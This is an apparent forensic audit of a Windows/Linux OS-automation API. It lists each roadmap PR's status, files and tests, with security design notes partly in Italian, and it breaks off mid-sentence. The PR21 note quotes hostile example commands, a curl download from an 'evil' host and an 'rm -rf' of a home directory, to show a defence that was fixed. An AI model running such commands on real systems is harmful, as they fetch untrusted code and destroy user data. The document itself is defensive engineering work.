# Forensic Audit — WinOs-Layer-
Generated for roadmap PRs #1–#50. Status: `DONE` | `PARTIAL` | `NOT_STARTED`.
Run: `python scripts/forensic_audit.py` (fails if DONE claims lack files/tests).
Tests: `pytest -q -m "not windows"` (fake fixtures via conftest + `tests/linux/` real LinuxBackend).
Live smoke: `python scripts/live_linux_smoke.py` / `DISPLAY=:2 python scripts/live_linux_ui_control_smoke.py`.
**Linux parity:** `LinuxBackend` is default on Linux (`WINOS_BACKEND=auto`); FakeBackend only when forced.

## PR1: Project structure + pyproject + package layout
- **Status:** DONE
- **Files:**
  - `pyproject.toml`
  - `windows_os_api/__init__.py`
  - `README.md`
  - `.gitignore`
- **Tests:**
  - `tests/unit/test_permissions.py`
- **How to run:** `pytest tests/unit/test_permissions.py -q`

## PR2: /v1/health /v1/system /v1/capabilities
- **Status:** DONE
- **Files:**
  - `windows_os_api/api/rest/health.py`
  - `windows_os_api/os/system/service.py`
- **Tests:**
  - `tests/integration/test_api_core.py`
- **How to run:** `pytest tests/integration/test_api_core.py -q`

## PR3: Security core: API keys, RBAC, audit, rate limit
- **Status:** DONE
- **Files:**
  - `windows_os_api/core/security/auth.py`
  - `windows_os_api/core/security/audit.py`
  - `windows_os_api/core/security/rate_limit.py`
  - `windows_os_api/core/permissions/model.py`
- **Tests:**
  - `tests/unit/test_security_core.py`
  - `tests/integration/test_api_core.py`
- **How to run:** `pytest tests/unit/test_security_core.py -q`

## PR4: System info/resources/uptime/power
- **Status:** DONE
- **Files:**
  - `windows_os_api/os/system/service.py`
  - `windows_os_api/api/rest/health.py`
- **Tests:**
  - `tests/integration/test_api_core.py`
  - `tests/unit/test_fake_backend.py`
- **How to run:** `pytest tests/integration/test_api_core.py -q`

## PR5: Processes CRUD/start/terminate
- **Status:** DONE
- **Files:**
  - `windows_os_api/os/processes/service.py`
  - `windows_os_api/api/rest/processes.py`
- **Tests:**
  - `tests/integration/test_api_core.py`
  - `tests/unit/test_fake_backend.py`
- **How to run:** `pytest tests/integration/test_api_core.py -q`

## PR6: App discovery (FakeBackend + Windows registry/paths + Linux .desktop)
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/discovery/service.py`
  - `windows_os_api/backends/fake.py`
  - `windows_os_api/backends/windows.py`
  - `windows_os_api/backends/linux.py`
- **Tests:**
  - `tests/unit/test_fake_backend.py`
  - `tests/integration/test_api_adapter_automation.py`
- **How to run:** `pytest tests/unit/test_fake_backend.py -q`

## PR7: Windows manager APIs
- **Status:** DONE
- **Files:**
  - `windows_os_api/os/windows/service.py`
  - `windows_os_api/os/windows/geometry.py` — validation, one home, applied by
    every backend at the point that acts
  - `windows_os_api/os/windows/errors.py` — structured `error_code` values
    (`WINDOW_NOT_FOUND`, `WINDOW_STILL_OPEN`, `FOCUS_NOT_GRANTED`,
    `TOOL_UNAVAILABLE`), added alongside the free-text `error`
  - `windows_os_api/api/rest/windows.py` — list/get/focus/close plus
    `move`, `resize`, `minimize`, `maximize`, `restore`
  - `windows_os_api/backends/{linux,windows,fake}.py` — geometry/state ops,
    each verifying the effect by reading it back
- **Tests:**
  - `tests/linux/test_window_manager_linux.py` — real X window under Xvfb + openbox
  - `tests/linux/test_window_contract_linux.py` — focus/close against real windows
  - `tests/windows/test_window_manager_windows.py` — real HWND on windows-latest
  - `tests/windows/test_window_contract_windows.py` — focus/close on windows-latest
  - `tests/unit/test_window_geometry_contract.py`
  - `tests/unit/test_window_focus_close_contract.py`
  - `tests/integration/test_api_os_layers.py`
- **How to run:** `pytest tests/unit/test_window_geometry_contract.py -q`
  (real windows: `xvfb-run -a pytest -m linux -q`)
- **Note:** `move`/`resize`/`minimize`/`maximize` did not exist — zero
  occurrences in either backend — although this entry already read DONE. They
  return the geometry the OS reports **after** the operation, in a field
  separate from the request, because a window manager may offset or quantise
  what it was asked for (measured: a move to (300,200) landed at (302,240); a
  resize to 700x500 came back 700x498). `ok` means the effect was observed, not
  that a command exited 0 — `wmctrl -i -r 99999999 -b add,maximized_vert` exits
  0 for a window id that does not exist.
- **Note (focus/close):** `focus_window` and `close_window` were left on the old
  contract by that change and fixed separately, by owner decision. Both ran
  their tool with `check=False` and returned `{"ok": True}` whatever happened,
  including for a window that did not exist — measured on a window whose
  process had been killed: `xdotool windowclose` exits 1 and `wmctrl -i -c`
  exits **0**. Focus is now read back (`getactivewindow` /
  `GetForegroundWindow`), and closing polls until the window is actually gone,
  because closing is a request an application may refuse. On Windows the
  mechanism differs and the conclusion does not: `PostMessage(WM_CLOSE)` is
  asynchronous, so returning without error never meant the window had closed.

## PR8: UI Automation tree + FakeBackend CRM + real Windows UIA
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/ui_inspector/service.py`
  - `windows_os_api/apps/ui_inspector/uia_windows.py`
  - `windows_os_api/backends/fake.py`
  - `windows_os_api/backends/windows.py`
- **Tests:**
  - `tests/unit/test_fake_backend.py`
  - `tests/unit/test_adapter_engine.py`
  - `tests/windows/test_uia_hard.py`
- **How to run:** `pytest tests/unit/test_fake_backend.py tests/windows/test_uia_hard.py -q`
- **Notes:** Windows UIA is **implemented** (uiautomation → comtypes → pywinauto). GHA `windows-latest` may lack a full interactive desktop; mark UI tests `requires_display` and skip when session 0.

## PR9: Mouse/keyboard input
- **Status:** DONE
- **Files:**
  - `windows_os_api/os/input/service.py`
  - `windows_os_api/os/input/validation.py` — button/scroll/key/chord/steps
    validation, one home, applied by every backend at the point that acts
  - `windows_os_api/api/rest/ui.py` — move/click/key/type plus `double-click`,
    `scroll`, `drag`, `position`, `keyboard/down`, `keyboard/up`, `hotkey`
  - `windows_os_api/backends/{linux,windows,fake}.py`
- **Tests:**
  - `tests/linux/test_input_linux.py` — delivery read back from `xev` under Xvfb
  - `tests/linux/test_x_harness_helpers.py` — the harness that reads it back:
    a hung `xdotool` comes back as `None`, geometry is measured, focus is read
    back, and a window manager under `SIGSTOP` does not take the job down
  - `tests/windows/test_input_windows.py` — real SendInput on windows-latest
  - `tests/unit/test_input_validation_contract.py`
  - `tests/integration/test_api_os_layers.py`
- **How to run:** `pytest tests/unit/test_input_validation_contract.py -q`
  (real delivery: `xvfb-run -a pytest -m linux -q`)
- **Note:** `double_click`, `scroll`, `key_down`, `key_up` and `hotkey` did not
  exist in any backend, and `mouse_drag` existed only in `windows.py`, although
  this entry already read DONE. Two defects found along the way, both on BOTH
  backends: an unknown mouse button fell through to left
  (`{"left": "1", ...}.get(button, "1")`), so a typo performed a left click
  reported as the button the caller named; and `mouse_move` on Linux returned
  `{"ok": True}` for a move that never happened — under a bare Xvfb with no
  window manager, `xdotool mousemove` is a silent no-op and the pointer stays
  at the screen centre. `ok` now means the OS accepted the event; the pointer,
  which IS readable, is verified.
- **Note (harness):** the `event_recorder` fixture positioned its `xev` window
  with `xdotool --sync`, which waits for the window manager to acknowledge the
  change. On a loaded runner the window manager does not get round to it, the
  wait ran to the subprocess timeout and `TimeoutExpired` came out of the middle
  of the fixture: one stalled `windowsize` failed the whole `test-linux` job
  while every test was passing (run 34276587508). Now the wait is bounded and
  reported instead of raised (`xdo`), the window is only acted on once the
  window manager has adopted it (`wait_until_managed`), and the rectangle the
  tests aim at is MEASURED rather than assumed to be the one that was requested.

## PR10: Clipboard
- **Status:** DONE
- **Files:**
  - `windows_os_api/os/input/service.py`
  - `windows_os_api/api/rest/ui.py`
- **Tests:**
  - `tests/integration/test_api_os_layers.py`
  - `tests/unit/test_fake_backend.py`
- **How to run:** `pytest tests/integration/test_api_os_layers.py -q`

## PR11: Displays/screenshots
- **Status:** DONE
- **Files:**
  - `windows_os_api/os/display/service.py`
  - `windows_os_api/api/rest/ui.py`
- **Tests:**
  - `tests/integration/test_api_os_layers.py`
- **How to run:** `pytest tests/integration/test_api_os_layers.py -q`

## PR12: Filesystem + sandbox policy
- **Status:** DONE
- **Files:**
  - `windows_os_api/os/filesystem/service.py`
  - `windows_os_api/api/rest/filesystem.py`
  - `windows_os_api/backends/fake.py`
- **Tests:**
  - `tests/integration/test_api_os_layers.py`
  - `tests/security/test_security_hard.py`
- **How to run:** `pytest tests/integration/test_api_os_layers.py -q`

## PR13: Storage/drives
- **Status:** DONE
- **Files:**
  - `windows_os_api/os/storage/service.py`
  - `windows_os_api/api/rest/filesystem.py`
- **Tests:**
  - `tests/integration/test_api_os_layers.py`
- **How to run:** `pytest tests/integration/test_api_os_layers.py -q`

## PR14: Network interfaces/connections + routes, DNS, ping
- **Status:** DONE
- **Files:**
  - `windows_os_api/os/network/service.py`
  - `windows_os_api/os/network/validation.py` — host/IP/ping-bounds validation,
    one home, applied by every backend at the point that acts
  - `windows_os_api/os/network/dns.py` — one resolver, shared by all backends
  - `windows_os_api/api/rest/network.py` — interfaces/connections plus
    `routes`, `dns/resolve`, `dns/reverse`, `ping`
  - `windows_os_api/backends/{linux,windows,fake}.py`
- **Tests:**
  - `tests/linux/test_network_linux.py` — kernel routing table + live resolver
  - `tests/windows/test_network_windows.py` — `route print` + Windows `ping`
  - `tests/unit/test_network_probes_contract.py`
  - `tests/integration/test_api_os_layers.py`
- **How to run:** `pytest tests/unit/test_network_probes_contract.py -q`
- **Note:** `list_routes`, `dns_resolve`/`dns_reverse` and `ping` did not exist,
  although this entry already read DONE. Design notes worth keeping:
  routes come from `/proc/net/route` on Linux (no binary: `ip` is absent on
  minimal systems, and an empty list would read as "no routes" when it meant
  "no tool"); DNS is `socket.getaddrinfo` in **one** shared module rather than
  three copies that could only drift; and `ping` is the first endpoint to hand
  a caller-supplied string to an external program, so a host is validated
  before it gets there. That is **option**-injection defence, not shell
  injection — argv already removes the shell, but `ping -f` is still a flood
  ping if `-f` arrives where a hostname belongs. A hostname cannot begin with
  `-`, which removes the class.

## PR15: Services control
- **Status:** DONE
- **Files:**
  - `windows_os_api/os/services/service.py`
  - `windows_os_api/api/rest/services.py`
- **Tests:**
  - `tests/integration/test_api_os_layers.py`
- **How to run:** `pytest tests/integration/test_api_os_layers.py -q`

## PR16: Audio devices/volume
- **Status:** DONE
- **Files:**
  - `windows_os_api/os/audio/service.py`
  - `windows_os_api/api/rest/services.py`
- **Tests:**
  - `tests/integration/test_api_os_layers.py`
- **How to run:** `pytest tests/integration/test_api_os_layers.py -q`

## PR17: Devices enumeration
- **Status:** DONE
- **Files:**
  - `windows_os_api/os/devices/service.py`
  - `windows_os_api/api/rest/services.py`
- **Tests:**
  - `tests/integration/test_api_os_layers.py`
- **How to run:** `pytest tests/integration/test_api_os_layers.py -q`

## PR18: Printers
- **Status:** DONE
- **Files:**
  - `windows_os_api/os/printers/service.py`
  - `windows_os_api/api/rest/services.py`
- **Tests:**
  - `tests/integration/test_api_os_layers.py`
- **How to run:** `pytest tests/integration/test_api_os_layers.py -q`

## PR19: Users/sessions
- **Status:** DONE
- **Files:**
  - `windows_os_api/os/users/service.py`
  - `windows_os_api/api/rest/services.py`
- **Tests:**
  - `tests/integration/test_api_os_layers.py`
- **How to run:** `pytest tests/integration/test_api_os_layers.py -q`

## PR20: Registry + policy
- **Status:** DONE
- **Files:**
  - `windows_os_api/os/registry/service.py`
  - `windows_os_api/os/registry/allowlist.py` — scrittura: allowlist di prefissi
    (D2-B); lettura: denylist di aree e di nomi di valore (D6)
  - `windows_os_api/api/rest/services.py`
- **Tests:**
  - `tests/unit/test_fake_backend.py`
  - `tests/integration/test_api_os_layers.py`
  - `tests/security/test_registry_write_allowlist.py`
  - `tests/security/test_registry_read_denylist.py`
  - `tests/windows/test_registry_read_denylist_windows.py` — chiavi vere su
    Windows vero, su un runner elevato
- **How to run:** `pytest tests/unit/test_fake_backend.py -q`
- **Note (lettura):** fino alla decisione owner **D6** la lettura non aveva
  **nessun** controllo di percorso — `read()` passava la stringa al backend — e
  `registry.read` è una permission che `ROLE_PERMISSIONS` assegna anche a
  `VIEWER`, il ruolo più basso. Il chiamante meno privilegiato poteva quindi
  leggere qualunque chiave apribile dal token del processo: fra le altre
  `...\CurrentVersion\Winlogon` (dove sta `DefaultPassword` in chiaro con
  l'autologon attivo) e `HKU\<SID>`, cioè l'`HKCU` di un altro utente.
  L'owner ha scelto la **denylist** (non l'allowlist simmetrica alla scrittura,
  e senza alzare il ruolo): sono vietate le tre aree già vietate in scrittura
  più `Winlogon` e l'hive `HKU\`, e sono rifiutati i nomi di valore che
  contengono termini da credenziale. Il filtro si applica **anche
  all'enumerazione** — chiedere la chiave senza `name` restituiva tutti i
  valori insieme, che era l'aggiramento in una mossa — e ciò che viene tolto è
  dichiarato in `withheld`, non nascosto.
  **Limite dichiarato:** una denylist è fail-open per costruzione, protegge solo
  ciò che qualcuno ha elencato. È il compromesso accettato in cambio del non
  rompere nessuna lettura esistente.
  **Trovato da CI su Windows vero:** il termine era `DIGITALPRODUCTID`, e
  `...\CurrentVersion` contiene un valore chiamato `ProductId` — più corto,
  quindi non conteneva il termine, e usciva. Ogni voce dell'elenco è ora lo
  *stem* della famiglia (`PRODUCTID`), e il confronto ignora i separatori, così
  `API_KEY` e `Proxy-Password` non passano per un underscore. Un termine più
  specifico del nome che vuole intercettare non intercetta niente.

## PR21: Terminal execute ALLOW|DENY|ADMIN
- **Status:** DONE
- **Files:**
  - `windows_os_api/os/terminal/allowlist.py` — command registry; commands run as
    argv with `shell=False`, anything unregistered is refused
  - `windows_os_api/os/terminal/service.py` — policy name validation, delegates
  - `windows_os_api/backends/{linux,windows,fake}.py` — **enforcement point**
  - `windows_os_api/api/rest/services.py` — `POST /v1/terminal/execute`
- **Tests:**
  - `tests/security/test_terminal_allowlist.py`
  - `tests/windows/test_terminal_allowlist_windows.py` — WindowsBackend reale su win32
  - `tests/unit/test_fake_backend.py`
  - `tests/integration/test_api_os_layers.py`
  - `tests/security/test_security_hard.py`
- **How to run:** `pytest tests/security/test_terminal_allowlist.py -q`
- **Note:** the previous design screened a raw string against a denylist of shell
  metacharacters and then ran it with `shell=True`. Commands containing none of
  those characters — `curl http://evil/x -o /tmp/x`, `rm -rf /home/user` — passed
  and executed under the plain ALLOW policy. Blocking chaining was never the same
  as blocking execution.

## PR22: Universal Adapter engine
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/adapters/engine.py`
- **Tests:**
  - `tests/unit/test_adapter_engine.py`
  - `tests/integration/test_api_adapter_automation.py`
- **How to run:** `pytest tests/unit/test_adapter_engine.py -q`

## PR23: App inspector (UI tree flatten/find)
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/ui_inspector/service.py`
- **Tests:**
  - `tests/unit/test_adapter_engine.py`
- **How to run:** `pytest tests/unit/test_adapter_engine.py -q`

## PR24: Semantic mapper
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/semantic/mapper.py`
- **Tests:**
  - `tests/unit/test_adapter_engine.py`
  - `tests/e2e/test_universal_adapter_e2e.py`
- **How to run:** `pytest tests/unit/test_adapter_engine.py -q`

## PR25: Action discovery
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/automation/actions.py`
- **Tests:**
  - `tests/integration/test_api_adapter_automation.py`
- **How to run:** `pytest tests/integration/test_api_adapter_automation.py -q`

## PR26: Workflow recorder
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/workflows/recorder.py`
  - `windows_os_api/api/rest/workflows.py`
- **Tests:**
  - `tests/unit/test_workflows_agent.py`
- **How to run:** `pytest tests/unit/test_workflows_agent.py -q`

## PR27: Adapter planner
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/planner/service.py`
- **Tests:**
  - `tests/unit/test_workflows_agent.py`
  - `tests/integration/test_api_adapter_automation.py`
- **How to run:** `pytest tests/unit/test_workflows_agent.py -q`

## PR28: AI UI reasoning (offline + LLM interface)
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/reasoning/offline.py`
- **Tests:**
  - `tests/unit/test_workflows_agent.py`
- **How to run:** `pytest tests/unit/test_workflows_agent.py -q`

## PR29: Auto workflow gen confidence/risk/rollback
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/workflows/generator.py`
- **Tests:**
  - `tests/unit/test_workflows_agent.py`
  - `tests/e2e/test_universal_adapter_e2e.py`
- **How to run:** `pytest tests/unit/test_workflows_agent.py -q`

## PR30: Self-healing selectors
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/healing/service.py`
- **Tests:**
  - `tests/unit/test_workflows_agent.py`
- **How to run:** `pytest tests/unit/test_workflows_agent.py -q`

## PR31: API schema generation
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/schema/generator.py`
- **Tests:**
  - `tests/unit/test_adapter_engine.py`
- **How to run:** `pytest tests/unit/test_adapter_engine.py -q`

## PR32: Per-app OpenAPI
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/adapters/engine.py`
  - `windows_os_api/api/rest/apps.py`
- **Tests:**
  - `tests/integration/test_api_adapter_automation.py`
  - `tests/e2e/test_universal_adapter_e2e.py`
- **How to run:** `pytest tests/integration/test_api_adapter_automation.py -q`

## PR33: /v1/apps registry
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/discovery/service.py`
  - `windows_os_api/api/rest/apps.py`
- **Tests:**
  - `tests/integration/test_api_adapter_automation.py`
- **How to run:** `pytest tests/integration/test_api_adapter_automation.py -q`

## PR34: Intent engine
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/intent/engine.py`
- **Tests:**
  - `tests/unit/test_workflows_agent.py`
  - `tests/integration/test_api_adapter_automation.py`
- **How to run:** `pytest tests/unit/test_workflows_agent.py -q`

## PR35: Computer agent
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/agent/computer.py`
  - `windows_os_api/apps/agent/gate.py` — the explicit execution gate
- **Tests:**
  - `tests/unit/test_agent_execution_gate.py`
  - `tests/unit/test_workflows_agent.py`
  - `tests/e2e/test_universal_adapter_e2e.py`
- **How to run:** `pytest tests/unit/test_agent_execution_gate.py -q`
- **Note:** the agent may execute its own plan, but only through a declared
  gate: `confidence >= 0.8` AND `risk == low` AND the sandbox policy allowing
  every step. Owner decision, issue #6.

  It previously decided on `plan["requires_confirmation"]` alone. That is true
  for every workflow the current generator produces, so the branch never ran and
  nothing said so — found because a test asserting things about `executed`
  passed while asserting nothing, `executed` being permanently `[]`. A dead
  branch that looks live is worse than either a live one or none.

  The gate is **not** the security boundary: `invoke_action` enforces the
  sandbox itself (#13). The gate decides whether to attempt and names the
  condition that stopped it; the enforcement point decides whether it happens.
  `test_the_sandbox_still_refuses_when_the_gate_wrongly_says_execute` forces the
  gate to say yes on a denied plan and proves the action is still refused —
  a wrong answer in the AI layer costs the accuracy of the report, never safety.

  With today's generator no workflow qualifies: the only high-confidence branch
  hardcodes `risk="medium"`, and creating a customer genuinely is a medium-risk
  action. That is a property of the generator, not of the gate, and the
  threshold was deliberately not lowered to make execution happen.

## PR36: MCP JSON-RPC server
- **Status:** DONE
- **Files:**
  - `windows_os_api/api/mcp/server.py`
- **Tests:**
  - `tests/unit/test_mcp.py`
- **How to run:** `pytest tests/unit/test_mcp.py -q`

## PR37: WebSocket event bus
- **Status:** DONE
- **Files:**
  - `windows_os_api/api/websocket/bus.py`
  - `windows_os_api/core/events/bus.py`
- **Tests:**
  - `tests/unit/test_event_bus.py`
- **How to run:** `pytest tests/unit/test_event_bus.py -q`

## PR38: Remote access policy (localhost default)
- **Status:** DONE
- **Files:**
  - `windows_os_api/core/runtime/config.py`
  - `windows_os_api/core/runtime/app.py`
  - `windows_os_api/api/rest/security_routes.py`
- **Tests:**
  - `tests/integration/test_api_core.py`
- **How to run:** `pytest tests/integration/test_api_core.py -q`

## PR39: Windows service installer scripts/module
- **Status:** DONE
- **Files:**
  - `windows_os_api/installer/service.py`
  - `installer/service_scripts/install_nssm.bat`
- **Tests:**
  - `tests/unit/test_windows_backend_guard.py`
- **How to run:** `pytest tests/unit/test_windows_backend_guard.py -q`

## PR40: Control Center HTML dashboard
- **Status:** DONE
- **Files:**
  - `windows_os_api/control_center/index.html`
  - `windows_os_api/core/runtime/app.py`
- **Tests:**
  - `tests/e2e/test_universal_adapter_e2e.py`
- **How to run:** `pytest tests/e2e/test_universal_adapter_e2e.py -q`

## PR41: Installer packaging (Inno/PyInstaller + GHA Windows Setup.exe)
- **Status:** DONE
- **Files:**
  - `installer/pyinstaller/winos-api.spec`
  - `installer/inno/winos-api.iss`
  - `installer/README.md`
  - `installer/service_scripts/`
  - `scripts/build_installer.py`
  - `.github/workflows/build.yml`
  - `.github/workflows/release.yml`
- **Tests:**
  - `tests/unit/test_build_installer.py`
  - `tests/unit/test_windows_backend_guard.py`
- **How to run:** `python scripts/build_installer.py validate && pytest tests/unit/test_build_installer.py -q`
- **Evidence:** `validate` + checksum unit tests pass on Linux; Linux PyInstaller portable smoke via `build-portable`; GHA `windows-latest` builds `winos-api.exe`, portable zip, and Inno `Setup.exe` (ISCC via chocolatey). Setup.exe is **not** produced on Linux by design — Windows GHA is the release path.

## PR42: Comprehensive automated tests
- **Status:** DONE
- **Files:**
  - `tests/conftest.py`
  - `tests/unit/`
  - `tests/integration/`
  - `tests/security/`
  - `tests/e2e/`
  - `tests/windows/`
- **Tests:**
  - `tests/integration/test_api_core.py`
  - `tests/e2e/test_universal_adapter_e2e.py`
  - `tests/windows/test_windows_backend_hard.py`
- **How to run:** `pytest -m "not windows" -q` (Linux); `pytest -m windows -q` (Windows GHA)

## PR43: GHA CI workflow Linux + windows-latest
- **Status:** DONE
- **Files:**
  - `.github/workflows/ci.yml`
- **Tests:**
  - `scripts/forensic_audit.py`
  - `tests/windows/`
  - `tests/linux/`
- **Note:** Linux job runs fake suite + `pytest -m linux` + live smoke; Windows job keeps fake + windows markers.
- **How to run:** `python scripts/forensic_audit.py`

## PR44: Release workflow with checksums
- **Status:** DONE
- **Files:**
  - `.github/workflows/release.yml`
  - `scripts/build_installer.py`
- **Tests:**
  - `tests/unit/test_build_installer.py`
- **How to run:** `pytest tests/unit/test_build_installer.py -q`

## PR45: Auto-update verify/backup/rollback
- **Status:** DONE
- **Files:**
  - `windows_os_api/update/manager.py`
- **Tests:**
  - `tests/unit/test_update_manager.py`
- **How to run:** `pytest tests/unit/test_update_manager.py -q`

## PR46: Security tests injection/path traversal
- **Status:** DONE
- **Files:**
  - `tests/security/test_security_hard.py`
- **Tests:**
  - `tests/security/test_security_hard.py`
- **How to run:** `pytest tests/security/test_security_hard.py -q`

## PR47: Adapter sandbox permissions
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/sandbox/permissions.py` — policy model and `check_action`
  - `windows_os_api/api/rest/security_routes.py` — `PUT/GET /v1/sandbox/policy`
  - `windows_os_api/apps/adapters/engine.py` — **enforcement point**: `invoke_action`
    calls `check_action` before reaching the backend, so the policy applies to every
    caller (REST, MCP, workflow playback, agent) instead of only the REST route
  - `windows_os_api/apps/sandbox/ui_guard.py` — **secondo punto di enforcement**:
    le primitive UI grezze non passano da `invoke_action`, quindi hanno il loro
  - `windows_os_api/apps/ui_inspector/service.py` — dove il guard è applicato
- **Tests:**
  - `tests/unit/test_trust_and_sandbox.py`
  - `tests/unit/test_sandbox_enforcement.py` — one test per surface that used to bypass the gate
  - `tests/security/test_sandbox_ui_primitives.py` — le tre rotte UI che la aggiravano
  - `tests/integration/test_api_adapter_automation.py`
- **How to run:** `pytest tests/unit/test_trust_and_sandbox.py tests/unit/test_sandbox_enforcement.py -q`
- **Note (primitive UI):** il gate in `invoke_action` copriva ogni superficie che
  passa dall'engine, ma **tre rotte agiscono sull'interfaccia senza passarci**:
  `POST /v1/ui/click`, `POST /v1/ui/set-text` e `POST /v1/ui/vision/click`.
  Misurato prima della correzione, con `denied_actions={"click_btn_save"}` in
  vigore: `invoke_action` → `denied=True`; `click_text_vision` → **nessuna policy
  consultata**, si fermava solo perché su uno schermo vuoto non c'era testo da
  trovare. Negare un'azione non impediva quindi di premere lo stesso pulsante
  chiamandolo per nome o per il testo che ci si legge sopra — una seconda porta
  sulla stessa stanza. Ora le tre primitive consultano la policy tramite gli
  adapter registrati (`automation_id`, nome o descrizione dell'azione), con
  rifiuto strutturato + **403** + audit. Le primitive restavano comunque
  protette dal RBAC (`ui.control`): il difetto era la policy per-azione
  aggirabile, non un endpoint aperto. Un bersaglio che nessun adapter riconosce
  passa — non era coperto da nessuna policy nemmeno prima.

## PR48: Signed adapter trust levels
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/trust/signing.py`
  - `windows_os_api/api/rest/security_routes.py`
- **Tests:**
  - `tests/unit/test_trust_and_sandbox.py`
- **How to run:** `pytest tests/unit/test_trust_and_sandbox.py -q`

## PR49: Observability metrics endpoint
- **Status:** DONE
- **Files:**
  - `windows_os_api/observability/metrics.py`
  - `windows_os_api/api/rest/security_routes.py`
- **Tests:**
  - `tests/integration/test_api_adapter_automation.py`
- **How to run:** `pytest tests/integration/test_api_adapter_automation.py -q`

## PR50: E2E universal adapter path, incluso EXE sconosciuto reale
- **Status:** DONE
- **Files:**
  - `windows_os_api/backends/fake.py`
  - `tests/fixtures/crm_ui_tree.json`
  - `windows_os_api/apps/adapters/store.py` — manifest versionato, persistenza
  - `windows_os_api/apps/adapters/engine.py` — reload all'avvio, aggancio finestra
  - `windows_os_api/apps/schema/generator.py` — OpenAPI dinamica dai verdetti
  - `windows_os_api/backends/windows.py` — discovery degli EXE in esecuzione
  - `windows_os_api/apps/semantic/mapper.py` — mapping generico non preconfigurato
  - `windows_os_api/apps/workflows/generator.py` — parametri richiesti dalle azioni
- **Tests:**
  - `tests/e2e/test_universal_adapter_e2e.py`
  - `tests/security/test_adapter_persistence.py`
  - `tests/security/test_verified_virtual_api.py`
  - `tests/unit/test_generic_semantic_pipeline.py`
  - `tests/windows/test_unknown_exe_e2e.py`
- **How to run:** `pytest tests/e2e/test_universal_adapter_e2e.py -q` e, su
  Windows, `pytest tests/windows/test_unknown_exe_e2e.py -q`
- **Perché non era DONE:** il test end-to-end gira interamente su una **fixture
  inventata** (`Contoso CRM`, `hwnd: 1001`, `crm_ui_tree.json`). Prova
  l'idraulica dell'API — discover, albero, azione, workflow — non che l'adapter
  funzioni su un'applicazione reale che nessuno ha descritto in anticipo. Un
  metodo che esiste non è una capability dimostrata: è la stessa distinzione che
  ha portato a `supported=false` (#28) e alla ricognizione stub.
- **Fatto adesso (persistenza):** un adapter creato viene scritto come manifest
  versionato e **rimesso in memoria all'avvio del runtime**, quindi l'ispezione
  che lo costruisce si fa una volta. Con una separazione che è il punto della
  patch: sopravvive la **descrizione** (azioni, `automation_id`, rischio), non
  il **legame** con la finestra — l'`hwnd` è un numero che il sistema
  riassegna, e ricaricarlo come valido darebbe un adapter che clicca su una
  finestra di un'altra applicazione. Un adapter ricaricato torna quindi *noto
  ma non agganciato*, e `invoke_action` lo rifiuta con `ADAPTER_NOT_BOUND`
  finché non viene riagganciato a una finestra viva. Manifest di versione ignota
  o corrotto: **saltato e riportato**, mai interpretato a naso.
- **Fatto adesso (capability verification):** `apps/adapters/verification.py`.
  Un verdetto nasce **solo** dall'effetto riletto dal sistema: si legge lo stato
  prima, si esegue l'azione, si rilegge dopo, e si guarda se è cambiato come
  doveva. Stati distinti perché dicono cose diverse — `VERIFIED` (osservato),
  `FAILED` (provato, effetto assente), `BLOCKED` (la policy nega: *non ho
  potuto*, che non è *non funziona*), `UNSUPPORTED` (nessun effetto osservabile
  definito: non lo sappiamo, e lo diciamo), `UNSTABLE` (esiti diversi fra
  tentativi), `DISCOVERED` (nessuno ha guardato). Il verdetto vive con l'adapter
  e sopravvive al riavvio; un test statico vieta che una `confidence` rientri
  nel giudizio. Per i campi editabili la prova usa una sonda UUID, controlla
  l'esito dell'invocazione e **ripristina sempre il valore originale**: anche il
  rollback viene riletto dal sistema e un suo fallimento produce
  `ROLLBACK_FAILED`, mai `VERIFIED`. Valori originali e dati dell'app non
  finiscono nel verdetto persistito. Le prove concorrenti sullo stesso adapter
  sono serializzate, così una sonda non può diventare il "valore originale"
  dell'altra. Button e MenuItem senza un contratto di effetto specifico restano
  `UNSUPPORTED` e non vengono premuti esplorativamente.
  **Due difetti trovati costruendolo**, entrambi tali da far concludere
  «verificata» per il motivo sbagliato: `FakeBackend.get_ui_tree` restituiva una
  copia **superficiale** della costante di modulo (i figli erano gli stessi
  oggetti, quindi chi scriveva nell'albero ricevuto mutava la fixture condivisa
  per tutti i test successivi), e `invoke_action` sul ramo Edit faceva
  esattamente quello — `node["value"] = value` su una copia, non
  sull'applicazione. L'effetto passa ora dal backend (`set_ui_value`), la copia
  è profonda, e il fake modella un effetto vero invece di uno screenshot.
  La capability verification è raggiungibile anche da REST
  (`POST /v1/apps/{app_id}/actions/{action_name}/verify`) e dal tool MCP
  `verify_action`, con permesso `adapter.manage`, audit e massimo 10 tentativi.
  I test hard guidano Notepad tramite UIA reale su Windows e Mousepad tramite
  AT-SPI reale sotto Xvfb/DBus su Linux; l'assenza delle dipendenze UI è un
  fallimento del job dedicato, non uno skip verde.
- **Fatto adesso (Virtual API dinamica):** il documento OpenAPI per-app non
  pubblica più ogni controllo trovato nell'albero. Un path entra soltanto con
  un verdetto strutturato il cui stato è esattamente `VERIFIED`; verdetti
  assenti, malformati, `FAILED`, `BLOCKED`, `UNSUPPORTED` o `UNSTABLE` restano
  fuori fail-closed. La superficie viene rigenerata nello stesso punto in cui
  si registra un nuovo verdetto, quindi una verifica fallita rimuove subito il
  path e una recovery lo ripristina. Il manifest conserva il risultato dopo il
  restart senza conservare l'`hwnd`. Lo schema del request body ora descrive la
  rotta reale (`{"params": {"value": ...}}`) invece del vecchio body piatto.
  Test hard aggiuntivi dimostrano che la capability verificata su Notepad/UIA
  reale e Mousepad/AT-SPI reale entra effettivamente nella Virtual API.
- **Chiusura del Gate 4:** `test_unknown_exe_e2e.py` compila durante il test un
  programma WinForms in una directory temporanea. Nome dell'EXE, titolo,
